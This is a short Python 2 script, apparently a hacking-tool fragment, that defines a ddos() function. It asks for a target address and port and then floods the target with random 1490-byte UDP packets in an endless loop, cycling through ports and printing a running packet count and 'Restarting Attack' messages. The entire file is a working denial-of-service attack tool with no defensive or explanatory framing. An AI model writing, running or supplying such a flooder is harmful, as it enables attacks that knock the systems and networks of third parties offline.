import os
import sys
import time
import socket
import random

def ddos():
    using = "\33[91;1musing\33[00m(\33[92;1mddos\33[00m) "
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    try:
        ip = raw_input(using + "ip<(")
        ip = socket.gethostbyname(ip)
        port = input(using + "Port<( ")
        sent = 0
        while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            port = port + 1
            print "\33[91;1m{}\33[00m packets sent to <(\33[92;1m{}\33[00m)> \33[91;1m<----+---->\33[00m".format(sent, ip)
            if port == 70000:
                print '\33[92;1mRestarting Attack... \33[00m'
                time.sleep(1)
                port = 1
    except:
        print '\33[91;1m[!]An Error occured\33[00m'

